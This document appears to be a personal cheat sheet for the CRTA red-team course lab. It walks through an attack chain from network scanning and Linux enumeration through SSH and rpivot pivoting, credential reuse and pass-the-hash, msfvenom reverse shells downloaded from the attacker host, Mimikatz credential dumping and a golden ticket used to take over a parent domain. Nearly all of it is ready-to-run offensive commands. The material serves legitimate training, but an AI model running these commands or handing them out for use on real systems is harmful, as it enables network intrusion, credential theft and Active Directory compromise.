# CRTA

{% hint style="danger" %}
USE THE TOOLS  PROVIDED BY THE COURSE
{% endhint %}

## Initial Access

### Discover the hosts

```bash
nmap -sn IP/MASK
```



### Port Scan

```bash
nmap -sC -sV IP
```





## External Web Site



Intercept the request with Burp Suite to try get some injection

### SSRF

...





## Enumeration

Once we have access to the machine, using LinPeas to get information

<pre class="language-bash"><code class="lang-bash"><strong># copy linpeas.sh and run this on att machine
</strong><strong>python3 -m http.server
</strong>
wget http://IP/linpeas.sh
chmod +x lin.sh
./lin.sh
</code></pre>

Manual enumeration for linux priv esc

```bash
sudo -l
```



### Scan another network

if the pwnd machine has 2 or more network interface we can use NMAP on victim machine (if it's installed) and discover another hosts.&#x20;

```bash
nmap -sn NETWORK_2/MASK
```

When we find some computers on that network we can perform further scan with nmap

```bash
nmap -sC -sV IP_2
```



### Find credentials to AD Domain

In a linux machine we can find some windows credentials in some log files like these:

```bash
cat .vnc_log
cat .mysql_history
```



### Through the Firefox Data

If we have a .mozilla directory, the dir might contains some interesting data.

We can check into the bookmarks.

```bash
cd ~/.mozilla/firefox/...default-release
ls
sqlite3 places.sqlite

> .tables
> SELECT * FROM moz_bookmarks;
```



## Pivoting&#x20;

### SSH

Once we have access to a machine with SSH credential we can create a tunnel to connect our machine to other networks.

Establish the tunnel on a local port

```bash
sudo apt install proxychains

ssh -D $LOCAL_PORT $USER@$VICTIM1_IP
# ex ssh -D 8090 mario@192.168.3.2
```

Once we have the tunnel established, we have modify our proxy file and add this port.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom
socks5 127.0.0.1 8090
socks4 127.0.0.1 8090
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# use nmap through the pivoting
proxychains nmap -sT $VICTIM2_IP

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP
```



### Rpivot



_RPIVOT allows to tunnel traffic into internal network via socks 4. It works like ssh dynamic port forwarding but in the opposite direction. Target machine as client and attack machine as server._

This tool is usefull when we have access to a machine through web rev shell but **we do not have the credentials** to make a SSH tunneling.

{% embed url="https://github.com/klsecservices/rpivot" %}

```bash
git clone https://github.com/klsecservices/rpivot
```

This tool works with Python2, to running it we can create a virtual env with conda

{% code overflow="wrap" %}
```bash
cd rpivot
conda create -n rpivot python=2.7

# Start the server on attacker machine
python2 server.py --server-port $SERVER_PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port $PROXY_PORT # (ex SERVER_PORT = 9980 and PROXY_PORT 9050)
# server_port = expose port from receiving client connection
# proxy_port = port which will be use by proxychains
```
{% endcode %}

Now we have to transfer the rpivot .zip directory to target machine

```bash
# attack machine in the dir where there is rpivot.zip
python3 -m http.server 80

# target machine
wget http://$ATT_IP/rpivot.zip
```

Check if in the target machine there is python2 installed and run the connection to the server.

```bash
# target machine
python --version # check python version

# conect to the rpivot server
python client.py --server-ip $ATT_IP --server-port $SERVER_PORT
```

When the connection has been initialized, we have to add this configuration to proxychain conf file.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom and COMMENT the socks5 if there is it
socks4 127.0.0.1 $PROXY_PORT
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# use nmap through the pivoting
proxychains nmap -sT $VICTIM2_IP

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP
```



## Internal Access

<figure><img src="../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

### Credentials logon trying

We can use the credentials found to try the access to Windows machine discovered.

```bash
proxychains crackmapexec smb $TARGET_IP -u $USER -p $PASS
```



### PsExec trying

With the validated credentials we can try to establish a connection with `impacket-psexec`

```bash
proxychains impacket-psexec '$DOMAIN/$USER:$PASS@$TARGET_IP'
```



### Get Information from the target

If we are in a windows env we can see in what domain is the machine with this command

```powershell
net user /dom
```

and view if there are another DC.

<figure><img src="../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>

Try to ping that and we have just discover another machine.

Check the domain groups

```powershell
net group /dom
```



### Create MSFvenom payload to stable shell

To upgrade the shell we can craft a msfvenom payload and execute it in the target machine.

{% code overflow="wrap" %}
```bash
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=$ATT_IP LPORT=$PORT -f exe -o rev.exe
```
{% endcode %}

Transfer the file to target machine

```bash
# target machine
iwr http://$ATT_IP/rev.exe -OutFile C:\Tmp\rev.exe
```

Set a listener and then run the executable

```bash
# attacker machine
nc -nvlp $PORT

# target machine
cd C:\Tmp
.\rev.exe
```

Now we have a stable shell



## AD Enumeration

### Get domain user information

```powershell
# users list
net user /dom

# user info
net user $USER /dom
```



### PowerView

```powershell
iwr http://$ATT_IP:PORT/PowerView.ps1 -OutFile C:\Users\...\pv.ps1

powershell -ep bypass
import-module .\pv.ps1
```

<pre class="language-powershell"><code class="lang-powershell"><strong># get the ad trust information
</strong><strong>Get-ADTrust -Filter * 
</strong>Get-DomainTrust -Filter *

# get forest information
Get-ADForest
</code></pre>

## Generate a Ticket to move between DCs

Requirements:

* Admin privilege on Child DC
* get krbtgt hash

```bash
proxychains impacket-secretdump 'DOMAIN/$USER@$DC_IP' -hashes :$LM
```

* SID of both child and parent machine

```powershell
# with PowerView
Get-DomainSID -Domain child.DOMAIN.com
Get-DomainSID -Domain DOMAIN.com
```

### Craft golden ticket

{% code overflow="wrap" %}
```powershell
.\mimi.exe

kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID /sids:$PARENT_DOMAIN_SID-519 /aes256:$KRBTGT_AES256 /startoffset:-5 /endin:600 /renew:10080 /ptt
```
{% endcode %}

Check the tickets in the session

```
klist
```

And now use it to access to Parent Domain Controller

Transfer the PsExec.exe to the ticketed session.&#x20;

```powershell
iwr http://$ATT_IP:PORT/PsExec.exe -OutFile C:\Users\..\ps.exe
```

We probably already are in PsExec session and we cannot make 2 session in 1. But to obatin a shell to Parent DC we can copy another RevShell to Parent DC.

```powershell
copy rev2.exe \\$PARENT_DC_NAME\c$
```

And now with PsExec we will execute the Rev2 to make a connection with Parent DC

```powershell
ps.exe -accepteula -d \\$PARENT_DC_NAME cmd /c "C:\Rev2.exe" 
```

## Lateral Movement

### Mimikatz

Get information using mimikatz (High privilege required)

```powershell
iwr http://$ATT_IP :PORT/mimikatz.exe -OutFile C:\Users\...\mimi.exe
```

```powershell
.\mimi.exe 

> sekurlsa::logonpasswords
```

If we found some NTLM we can perform pass-the-hash attack

```bash
proxychains crackmapexec smb $IP -u $USER -H $LM 
```

When we found a machine Pwnd we can perform lateral movement with PsExec

```bash
proxuchains impacket-psexec 'DOMAIN/$USER@$IP' -hashes :$LM
```



